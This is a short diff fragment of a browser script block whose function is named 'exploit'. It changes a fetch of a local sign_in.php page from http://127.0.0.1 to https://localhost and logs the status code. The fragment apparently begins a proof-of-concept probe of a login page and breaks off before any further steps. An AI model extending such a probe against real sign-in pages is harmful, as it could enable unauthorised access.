@@ -1,7 +1,7 @@
 <script>
 (async function exploit() {
     try {
-        var response = await fetch("http://127.0.0.1/sign_in.php");
+        var response = await fetch("https://localhost/sign_in.php");
         var statusCode = response.status;
         console.log(`code = ${statusCode}`);
         
